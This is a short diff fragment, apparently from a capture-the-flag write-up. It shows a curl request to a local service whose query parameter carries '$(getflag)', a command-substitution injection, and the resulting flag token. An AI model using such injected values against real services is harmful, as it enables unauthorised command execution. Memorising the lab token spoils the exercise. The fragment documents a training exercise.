@@ -26,3 +26,5 @@
    CM : curl 'localhost:4747?x=$(getflag)
    OUTPUT : Check flag.
             Here is your token : ne2searoevaevoem4ov4ar8ap
+
+
